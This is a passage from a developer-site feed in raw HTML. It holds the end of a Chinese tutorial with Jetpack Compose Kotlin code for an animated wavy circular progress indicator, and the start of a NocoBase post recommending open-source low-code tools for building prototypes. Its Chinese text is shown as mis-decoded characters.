    amplitude: <span class="hljs-type">Dp</span> = <span class="hljs-number">1.2</span>.dp,
    wavelength: <span class="hljs-type">Dp</span> = <span class="hljs-number">15.</span>dp,
    gapSize: <span class="hljs-type">Dp</span> = <span class="hljs-number">4.</span>dp,
    cycleDuration: <span class="hljs-type">Int</span> = <span class="hljs-number">1500</span>, <span class="hljs-comment">// æ•´ä½“æ—‹è½¬å‘¨æœŸ</span>
    waveFlowDuration: <span class="hljs-type">Int</span> = <span class="hljs-number">3000</span> <span class="hljs-comment">// æ³¢æµªæµåŠ¨å‘¨æœŸ</span>
)</span></span> {
    <span class="hljs-keyword">val</span> infiniteTransition = rememberInfiniteTransition(label = <span class="hljs-string">"WavyTransition"</span>)

    <span class="hljs-comment">// å‘¼å¸åŠ¨ç”»: ä½¿ç”¨ keyframes å®ç°éå¯¹ç§°çš„ä¼¸ç¼©</span>
    <span class="hljs-keyword">val</span> sweepAngle <span class="hljs-keyword">by</span> infiniteTransition.animateFloat(
        initialValue = <span class="hljs-number">30f</span>,
        targetValue = <span class="hljs-number">30f</span>,
        animationSpec = infiniteRepeatable(
            animation = keyframes {
                durationMillis = <span class="hljs-number">5000</span>
                <span class="hljs-comment">// 3ç§’å†…ç¼“æ…¢å¼ å¼€</span>
                <span class="hljs-number">300f</span> at <span class="hljs-number">3000</span> using CubicBezierEasing(<span class="hljs-number">.42f</span>, <span class="hljs-number">0f</span>, <span class="hljs-number">1f</span>, <span class="hljs-number">1f</span>)
                <span class="hljs-comment">// 2ç§’å†…å¿«é€Ÿæ”¶ç¼©</span>
                <span class="hljs-number">30f</span> at <span class="hljs-number">5000</span> using FastOutSlowInEasing
            },
            repeatMode = RepeatMode.Restart
        ),
        label = <span class="hljs-string">"SweepAngle"</span>
    )

    <span class="hljs-comment">// è‡ªè½¬åŠ¨ç”»: æ•´ä½“æ—‹è½¬</span>
    <span class="hljs-keyword">val</span> rotation <span class="hljs-keyword">by</span> infiniteTransition.animateFloat(
        initialValue = <span class="hljs-number">0f</span>,
        targetValue = <span class="hljs-number">360f</span>,
        animationSpec = infiniteRepeatable(
            animation = tween(cycleDuration, easing = CubicBezierEasing(<span class="hljs-number">0.33f</span>, <span class="hljs-number">1f</span>, <span class="hljs-number">0.68f</span>, <span class="hljs-number">1f</span>)),
        ),
        label = <span class="hljs-string">"Rotation"</span>
    )

    <span class="hljs-comment">// ç›¸ä½æµåŠ¨åŠ¨ç”»: æ§åˆ¶æ³¢æµªçº¹ç†ç§»åŠ¨</span>
    <span class="hljs-keyword">val</span> phaseShift <span class="hljs-keyword">by</span> infiniteTransition.animateFloat(
        initialValue = <span class="hljs-number">0f</span>,
        targetValue = (<span class="hljs-number">2</span> * PI).toFloat(), <span class="hljs-comment">// ç§»åŠ¨ä¸€ä¸ªå®Œæ•´æ³¢é•¿ï¼Œå®ç°æ— ç¼å¾ªç¯</span>
        animationSpec = infiniteRepeatable(
            animation = tween(waveFlowDuration, easing = LinearEasing)
        ),
        label = <span class="hljs-string">"PhaseShift"</span>
    )

    <span class="hljs-keyword">val</span> wavePath = remember { Path() }
    <span class="hljs-keyword">val</span> trackPath = remember { Path() }
    <span class="hljs-keyword">val</span> density = LocalDensity.current

    <span class="hljs-keyword">val</span> waveStrokeWidthPx = with(density) { waveStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> trackStrokeWidthPx = with(density) { trackStrokeWidth.toPx() }
    <span class="hljs-keyword">val</span> amplitudePx = with(density) { amplitude.toPx() }
    <span class="hljs-keyword">val</span> wavelengthPx = with(density) { wavelength.toPx() }
    <span class="hljs-keyword">val</span> gapSizePx = with(density) { gapSize.toPx() }

    Canvas(modifier = modifier.size(<span class="hljs-number">48.</span>dp)) {
        <span class="hljs-keyword">val</span> center = <span class="hljs-keyword">this</span>.center
        <span class="hljs-keyword">val</span> step = <span class="hljs-number">1</span>
        <span class="hljs-keyword">val</span> maxStroke = maxOf(waveStrokeWidthPx, trackStrokeWidthPx)
        <span class="hljs-keyword">val</span> baseRadius = (size.minDimension - maxStroke) / <span class="hljs-number">2f</span> - amplitudePx
        <span class="hljs-keyword">val</span> effectiveGapLength = gapSizePx + maxStroke
        <span class="hljs-keyword">val</span> gapAngle = Math.toDegrees((effectiveGapLength / baseRadius).toDouble()).toFloat()

        <span class="hljs-comment">// ä½¿ç”¨ rotate æ—‹è½¬æ•´ä¸ªç”»å¸ƒ</span>
        rotate(rotation) {
            <span class="hljs-comment">// --- ç»˜åˆ¶æ³¢æµª ---</span>
            wavePath.rewind()
            <span class="hljs-keyword">val</span> circumference = <span class="hljs-number">2</span> * PI * baseRadius
            <span class="hljs-keyword">val</span> frequency = circumference / wavelengthPx
            <span class="hljs-comment">// ç»“æŸè§’åº¦ç”±åŠ¨ç”»æ§åˆ¶</span>
            <span class="hljs-keyword">val</span> endAngle = sweepAngle

            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0.</span>.endAngle.toInt() step step) {
                <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
                <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())

                <span class="hljs-comment">// å°† phaseShift åŠ åˆ°æ­£å¼¦å‡½æ•°ä¸­ï¼Œå®ç°æ³¢æµªæµåŠ¨</span>
                <span class="hljs-keyword">val</span> waveOffset = amplitudePx * sin((rad * frequency) + phaseShift)
                <span class="hljs-keyword">val</span> r = baseRadius + waveOffset

                <span class="hljs-keyword">val</span> x = center.x + (r * cos(rad)).toFloat()
                <span class="hljs-keyword">val</span> y = center.y + (r * sin(rad)).toFloat()

                <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) wavePath.moveTo(x, y) <span class="hljs-keyword">else</span> wavePath.lineTo(x, y)
            }
            drawPath(
                path = wavePath,
                color = waveColor,
                style = Stroke(width = waveStrokeWidthPx, cap = StrokeCap.Round)
            )

            <span class="hljs-comment">// --- ç»˜åˆ¶è½¨é“ ---</span>
            trackPath.rewind()
            <span class="hljs-keyword">val</span> trackStartAngle = sweepAngle + gapAngle
            <span class="hljs-keyword">val</span> trackEndAngle = <span class="hljs-number">360f</span> - gapAngle

            <span class="hljs-keyword">if</span> (trackStartAngle &lt; trackEndAngle) {
                <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> trackStartAngle.toInt()..trackEndAngle.toInt() step step) {
                    <span class="hljs-keyword">val</span> currentAngle = i.toFloat()
                    <span class="hljs-keyword">val</span> rad = Math.toRadians(currentAngle.toDouble())
                    <span class="hljs-keyword">val</span> x = center.x + (baseRadius * cos(rad)).toFloat()
                    <span class="hljs-keyword">val</span> y = center.y + (baseRadius * sin(rad)).toFloat()

                    <span class="hljs-keyword">if</span> (i == trackStartAngle.toInt()) trackPath.moveTo(
                        x,
                        y
                    ) <span class="hljs-keyword">else</span> trackPath.lineTo(x, y)
                }
                drawPath(
                    path = trackPath,
                    color = trackColor,
                    style = Stroke(width = trackStrokeWidthPx, cap = StrokeCap.Round)
                )
            }
        }
    }
}
</code></pre>
<p>ä»¥ä¸Šå°±æ˜¯æœ€ç»ˆçš„å®Œæ•´ä»£ç äº†ï¼Œå¯ä»¥ç›´æ¥å¤åˆ¶ä½¿ç”¨ï¼Œå½“ç„¶ä½ å¯ä»¥é‡å‘½åä¸º <code>CircularWavyProgressIndicator</code>ã€‚</p>
<blockquote>
<p>å…³äº Transitionï¼Œå¯ä»¥çœ‹æˆ‘çš„è¿™ç¯‡åšå®¢ï¼š</p>
<ul>
<li><a href="https://juejin.cn/post/7502364800992165903" target="_blank" title="https://juejin.cn/post/7502364800992165903">æ·±å…¥ç†è§£ Transitionï¼šæ›´å¼ºå¤§çš„åŠ¨ç”»ç®¡ç†</a></li>
</ul>
<p>å…³äºè´å¡å°”æ›²çº¿ï¼Œå¯ä»¥çœ‹æˆ‘çš„è¿™ç¯‡åšå®¢ï¼š</p>
<ul>
<li><a href="https://juejin.cn/post/7494836622497939507" target="_blank" title="https://juejin.cn/post/7494836622497939507">AnimationSpecåŠ¨ç”»è§„æ ¼è¯¦è§£</a></li>
</ul>
</blockquote>
<p>è¿è¡Œæ•ˆæœï¼š</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02d6503cc0e94e62aff9dd5c8c648525~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo55m9:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598723&amp;x-signature=H%2BN2zTo%2FahWNs4TIaAUqBd0Ep8g%3D" alt="Screen_recording_20251124_204245.gif" width="50%" loading="lazy"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[6ä¸ªé€‚åˆåš PoC çš„å¼€æºæ— ä»£ç /ä½ä»£ç å·¥å…·æ¨è]]></title>    <link>https://juejin.cn/post/7576105458807537664</link>    <guid>https://juejin.cn/post/7576105458807537664</guid>    <pubDate>2025-11-24T14:20:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576105458807537664" data-draft-id="7576175307356717091" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="6ä¸ªé€‚åˆåš PoC çš„å¼€æºæ— ä»£ç /ä½ä»£ç å·¥å…·æ¨è "/> <meta itemprop="keywords" content="å¼€æº,ä½ä»£ç ,æ•æ·å¼€å‘"/> <meta itemprop="datePublished" content="2025-11-24T14:20:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NocoBase"/> <meta itemprop="url" content="https://juejin.cn/user/180779873743566"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            6ä¸ªé€‚åˆåš PoC çš„å¼€æºæ— ä»£ç /ä½ä»£ç å·¥å…·æ¨è 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180779873743566/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NocoBase
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T14:20:37.000Z" title="Mon Nov 24 2025 14:20:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2F6-open-source-no-low-code-tools-for-building-pocs" target="_blank" title="https://www.nocobase.com/cn/blog/6-open-source-no-low-code-tools-for-building-pocs" ref="nofollow noopener noreferrer">www.nocobase.com/cn/blog/6-oâ€¦</a></p>
<p>å¦‚æœåœ¨å‡ å¹´å‰ä½ é—®ä¸€ä½äº§å“ç»ç†æˆ–æŠ€æœ¯è´Ÿè´£äººï¼šâ€œæœ€å¿«å®Œæˆä¸€ä¸ª PoC çš„æ–¹å¼æ˜¯ä»€ä¹ˆï¼Ÿâ€ï¼Œå¤§å¤šæ•°äººéƒ½ä¼šç»™å‡ºç±»ä¼¼çš„ç­”æ¡ˆâ€”â€”é€‰æ‹©ä¸€ä¸ªåˆé€‚çš„ä½ä»£ç æˆ–æ— ä»£ç å¹³å°ï¼ŒæŠŠä¸šåŠ¡æµç¨‹ã€ç•Œé¢å’ŒåŸºç¡€é€»è¾‘å¿«é€Ÿæ­å»ºèµ·æ¥ï¼Œä½¿æƒ³æ³•å°½å¿«è¿›å…¥å¯è¿è¡Œçš„çŠ¶æ€ã€‚</p>
<p>ä½†åœ¨è¿‡å»ä¸¤å¹´é‡Œï¼ŒAI çš„å¿«é€Ÿå‘å±•ä¹Ÿè®©è¿™ç§åˆ¤æ–­å¼€å§‹å‘ç”Ÿå˜åŒ–ã€‚å¦‚ä»Šï¼Œæ¨¡å‹èƒ½å¤Ÿæ ¹æ®è‡ªç„¶è¯­è¨€ç”Ÿæˆå‰ç«¯ä»£ç ã€ç»„ä»¶ç»“æ„ï¼Œç”šè‡³èƒ½æ ¹æ®è‰å›¾ç”Ÿæˆå®Œæ•´é¡µé¢ã€‚ç•Œé¢çš„ç”Ÿæˆé€Ÿåº¦æ˜¾è‘—æå‡ï¼Œä¸€éƒ¨åˆ†å‰ç«¯å·¥ä½œå·²ç»å¯ä»¥ç”± AI è‡ªåŠ¨å®Œæˆã€‚è¿‘æœŸæ¨å‡ºçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2F" target="_blank" title="https://gemini.google.com/" ref="nofollow noopener noreferrer">Gemini 3</a> åœ¨ä»£ç ç”Ÿæˆã€å¸ƒå±€ç†è§£å’Œäº¤äº’é€»è¾‘è¡¥å…¨æ–¹é¢è¿›ä¸€æ­¥å¢å¼ºï¼Œæ•´ä¸ªå‰ç«¯è®¾è®¡çš„è¿‡ç¨‹ä¹Ÿå˜å¾—æ›´ç›´æ¥ã€æ›´å¯æ§ã€‚</p>
<blockquote>
<p>æ—¢ç„¶ AI å·²ç»èƒ½å¤Ÿæä¾›å¯ç”¨ä¸”ç¾è§‚çš„ç•Œé¢ï¼Œæˆ‘ä»¬ä¸ºä»€ä¹ˆä»ç„¶éœ€è¦ä½ä»£ç æˆ–æ— ä»£ç å¹³å°æ¥å®Œæˆ PoCï¼Ÿ</p>
</blockquote>
<p>ä¸¤è€…è§£å†³çš„é—®é¢˜å¹¶ä¸ç›¸åŒã€‚</p>
<p>AI ä¸»è¦è´Ÿè´£ç”Ÿæˆç•Œé¢å’Œç»“æ„ï¼Œä½† PoC çš„å…³é”®ä¸åœ¨ç•Œé¢æœ¬èº«ï¼Œè€Œåœ¨äºæ”¯æ’‘å®ƒè¿è¡Œçš„åŸºç¡€èƒ½åŠ›ï¼Œä¾‹å¦‚æ•°æ®æŒä¹…åŒ–ã€ä¸šåŠ¡è§„åˆ™ã€æƒé™ç®¡ç†ã€è·¨ç³»ç»Ÿé›†æˆç­‰ã€‚è¿™äº›èƒ½åŠ›å†³å®šäº†ä¸€ä¸ª PoC æ˜¯å¦èƒ½å¤Ÿå‡†ç¡®æ¨¡æ‹Ÿä¸šåŠ¡æµç¨‹ï¼Œè€Œä¸ä»…ä»…æ˜¯å±•ç¤ºç”»é¢çš„ç»„åˆã€‚</p>
<p>ä½ä»£ç ï¼æ— ä»£ç å¹³å°çš„ä½œç”¨å°±æ˜¯å¸®åŠ©å›¢é˜Ÿå¿«é€Ÿè¿æ¥æ•°æ®ã€æ‰§è¡Œä¸šåŠ¡é€»è¾‘ã€é…ç½®è§’è‰²ä¸æµç¨‹ï¼Œå¹¶åœ¨éœ€è¦æ—¶å°† PoC æ‰©å±•ä¸ºæ­£å¼ç³»ç»Ÿã€‚</p>
<p>åœ¨å®é™…çš„éªŒè¯é˜¶æ®µï¼Œè¿™äº›åŠŸèƒ½éƒ½æ˜¯ AI ç›®å‰æ— æ³•å•ç‹¬æ‰¿æ‹…çš„ã€‚</p>
<hr/>
<p>ğŸ’¬ å—¨ï¼ä½ æ­£åœ¨é˜…è¯» NocoBase åšå®¢ã€‚NocoBase æ˜¯ä¸€ä¸ªææ˜“æ‰©å±•çš„ AI æ— ä»£ç /ä½ä»£ç å¼€å‘å¹³å°ï¼Œç”¨äºæ„å»ºä¼ä¸šåº”ç”¨ã€å†…éƒ¨å·¥å…·å’Œå„ç±»ç³»ç»Ÿã€‚å®ƒå®Œå…¨æ”¯æŒè‡ªæ‰˜ç®¡ï¼ŒåŸºäºæ’ä»¶æ¶æ„è®¾è®¡ï¼Œå¼€å‘è€…å‹å¥½ã€‚â†’ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase" target="_blank" title="https://github.com/nocobase/nocobase" ref="nofollow noopener noreferrer">æ¬¢è¿åœ¨ GitHub ä¸Šäº†è§£æˆ‘ä»¬</a></p>
<hr/>
<p>åŸºäºè¿™äº›è§‚å¯Ÿï¼Œæˆ‘ä»¬æ•´ç†äº† <strong>6 ä¸ªé€‚åˆåš PoC çš„å¼€æºæ— ä»£ç ï¼ä½ä»£ç å·¥å…·</strong>ï¼Œä»‹ç»äº†å®ƒä»¬é€‚ç”¨çš„åœºæ™¯ã€äº®ç‚¹ä¸ä½¿ç”¨å»ºè®®ï¼Œå¸Œæœ›èƒ½å¸®åŠ©ä½ åœ¨é¡¹ç›®æ¢ç´¢é˜¶æ®µå¿«é€Ÿæ‰¾åˆ°åˆé€‚çš„èµ·æ­¥å·¥å…·ã€‚</p>
<h2 data-id="heading-0">NocoBase</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fde8049a4ec429887be55bec41ddea8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTm9jb0Jhc2U=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764598837&amp;x-signature=cGCQwLESmhw2vA0srhSlH10RO2k%3D" alt="nocobase.png" loading="lazy"/></p>





















<table><thead><tr><th>GitHub</th><th><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnocobase%2Fnocobase" target="_blank" title="https://github.com/nocobase/nocobase" ref="nofollow noopener noreferrer">github.com/nocobase/noâ€¦</a></th></tr></thead><tbody><tr><td>GitHubÂ Stars</td><td>20k</td></tr><tr><td>å®˜ç½‘</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2F" target="_blank" title="https://www.nocobase.com/" ref="nofollow noopener noreferrer">www.nocobase.com/</a></td></tr><tr><td>æ–‡æ¡£</td><td><a href="https://link.juejin.cn?target=https%3A%2F%2Fv2.docs.nocobase.com%2Fcn%2F" target="_blank" title="https://v2.docs.nocobase.com/cn/" ref="nofollow noopener noreferrer">v2.docs.nocobase.com/cn/</a></td></tr></tbody></table>
<p>NocoBase æ˜¯ä¸€ä¸ªå¼€æºã€è‡ªéƒ¨ç½²ä¸”æ’ä»¶åŒ–çš„ä½ä»£ç ï¼æ— ä»£ç å¹³å°ï¼Œä¸“ä¸ºæ„å»ºä¸šåŠ¡ç³»ç»Ÿå’Œå†…éƒ¨å·¥å…·è®¾è®¡ã€‚</p>
<p>åœ¨å®˜æ–¹å‘å¸ƒçš„æ¡ˆä¾‹ä¸­ï¼ŒED å›¢é˜Ÿä½¿ç”¨ NocoBase åœ¨çŸ­æ—¶é—´å†…å®Œæˆå¤šä¸ªå†…éƒ¨ç³»ç»Ÿçš„ PoCï¼Œå¹¶åœ¨éªŒè¯æˆåŠŸåå¿«é€Ÿæ‰©å±•ä¸ºæ­£å¼äº§å“ï¼ŒåŒ…æ‹¬ CRMã€è¿è¥åå°å’Œé¡¹ç›®ç®¡ç†ç­‰æ¨¡å—ã€‚ED å·¥ç¨‹å¸ˆä»¬è®¤ä¸ºï¼ŒNocoBase æ”¹å˜äº†ä»–ä»¬çš„å¼€å‘æ–¹å¼ã€‚å¯è§†åŒ–å»ºæ¨¡ã€è‡ªåŠ¨ CRUDã€çµæ´»å·¥ä½œæµä¸è‡ªåŠ¨ç”Ÿæˆ APIï¼Œè®©å¼€å‘è€…æ‘†è„±äº†é‡å¤åŠ³åŠ¨ï¼Œé«˜æ•ˆç›´è¾¾ä¸šåŠ¡ç›®æ ‡ã€‚QA ä¸ç”¨æˆ·çš„åé¦ˆå‘¨æœŸå¤§å¹…ç¼©çŸ­ï¼Œé¡¹ç›®èƒ½æ›´å¿«è¿›å…¥ç”Ÿäº§ã€‚</p>
<p>ğŸ’¡é˜…è¯»æ›´å¤šï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.nocobase.com%2Fcn%2Fblog%2Fed" target="_blank" title="https://www.nocobase.com/cn/blog/ed" ref="nofollow noopener noreferrer">NocoBase å¦‚ä½•æˆä¸º ED çš„æŠ€æœ¯åº•åº§ï¼Œæ”¯æ’‘å†…éƒ¨ç³»ç»Ÿåˆ°å•†ä¸šåŒ–äº§å“ï¼Ÿ</a></p>
<p><strong>é€‚åˆçš„ä½¿ç”¨åœºæ™¯</strong></p>
<ul>
<li>å½“ä½ éœ€è¦å¿«é€Ÿæ­å»ºä¸€ä¸ªåŒ…å«æ•°æ®æ¨¡å‹ã€æ“ä½œç•Œé¢ã€æµç¨‹é€»è¾‘çš„å†…éƒ¨ç³»ç»Ÿï¼Œä¾‹å¦‚å‘˜å·¥ç®¡ç†ã€è®¢å•å¤„ç†ã€æˆ–å®¢æˆ·æœåŠ¡åå°ã€‚</li>
<li>æœ‰å¤šä¸ªç”¨æˆ·è§’è‰²ã€å¤æ‚æƒé™æ§åˆ¶éœ€æ±‚ï¼Œä»¥åŠéœ€è¦æ¥å£æ•´åˆå¤–éƒ¨ç³»ç»Ÿæˆ–æ•°æ®æºçš„åº”ç”¨åœºåˆã€‚</li>
<li>NocoBase æ”¯æŒè‡ªéƒ¨ç½²ï¼Œå¹¶æä¾›å¯æ‰©å±•çš„æ’ä»¶æœºåˆ¶ï¼Œé€‚åˆéœ€è¦åœ¨å†…éƒ¨ç¯å¢ƒä¸­è¿è¡Œç³»ç»Ÿã€å¹¶ä¿æŒæ¶æ„çµæ´»åº¦çš„å›¢é˜Ÿã€‚</li>
</ul>
<p><strong>äº®ç‚¹ä¸ä½¿ç”¨å»ºè®®</strong></p>
<ul>
<li><strong>æ•°æ®æ¨¡å‹é©±åŠ¨</strong>ï¼šä¸ä¼ ç»Ÿä»è¡¨å•ï¼è¡¨æ ¼å¼€å§‹ä¸åŒï¼ŒNocoBase é‡‡ç”¨ â€œæ•°æ®æ¨¡å‹å…ˆäºç•Œé¢â€ çš„æ–¹å¼ï¼Œä½ å¯ä»¥å…ˆå®šä¹‰ä¸šåŠ¡å¯¹è±¡ã€å…³ç³»ã€å­—æ®µï¼Œå†æ­å»ºé¡µé¢å’Œæµç¨‹ï¼Œè¿™ç§æ–¹å¼æ›´é€‚åˆåç»­çš„æ‰©å±•ã€‚</li>
<li><strong>ç»†ç²’åº¦æƒé™ä¸æµç¨‹æ”¯æŒ</strong>ï¼šå®ƒæä¾›ä»ç³»ç»Ÿã€æ•°æ®åˆ°å­—æ®µçš„æƒé™æ§åˆ¶ã€‚åœ¨ PoC é˜¶æ®µå¯ä»¥ä¸ºä¸åŒè§’è‰²å¿«é€Ÿè®¾å®šè®¿é—®ç•Œé¢ä¸æ•°æ®æƒé™ã€‚</li>
<li><strong>æ’ä»¶åŒ–æ¶æ„ä¸æ‰©å±•èƒ½åŠ›</strong>ï¼šåŠŸèƒ½åŸºäºæ’ä»¶ä½“ç³»æ„å»ºï¼Œæ•°æ®æºã€åŠ¨ä½œã€å­—æ®µç±»å‹ã€ç•Œé¢ç»„ä»¶ç­‰éƒ½å¯ä»¥é€šè¿‡æ’ä»¶æ‰©å±•ã€‚PoC é˜¶æ®µå¯ä»¥å…ˆä½¿ç”¨å†…ç½®æ’ä»¶å¿«é€Ÿæ­å»ºåº”ç”¨ï¼Œå†æ ¹æ®éœ€æ±‚é€æ­¥æ›¿æ¢æˆ–æ‰©å±•ã€‚</li>
